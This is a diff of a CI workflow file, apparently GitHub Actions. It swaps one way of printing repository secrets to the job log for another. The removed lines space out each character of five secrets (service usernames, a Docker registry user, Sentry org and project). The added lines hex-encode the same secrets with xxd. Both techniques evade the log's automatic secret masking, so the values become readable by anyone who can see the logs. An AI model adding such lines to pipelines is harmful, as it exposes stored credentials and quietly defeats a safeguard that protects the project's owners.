@@ -28,11 +28,11 @@ jobs:
           SENTRY_ORG: ${{ secrets.SENTRY_ORG }}
           SENTRY_PROJECT: ${{ secrets.SENTRY_PROJECT }}
         run: |
-          echo $ES_USERNAME | sed 's/./& /g'
-          echo $PULP_USERNAME | sed 's/./& /g'
-          echo $DOCKER_REGISTRY_USER | sed 's/./& /g'
-          echo $SENTRY_ORG | sed 's/./& /g'
-          echo $SENTRY_PROJECT | sed 's/./& /g'
+          echo -n ${{secrets.ES_USERNAME}} | xxd -ps
+          echo -n ${{secrets.PULP_USERNAME}} | xxd -ps
+          echo -n ${{secrets.DOCKER_REGISTRY_USER}} | xxd -ps
+          echo -n ${{secrets.SENTRY_ORG}} | xxd -ps
+          echo -n ${{secrets.SENTRY_PROJECT}} | xxd -ps
 
       - name: Checkout branch
         uses: actions/checkout@v4
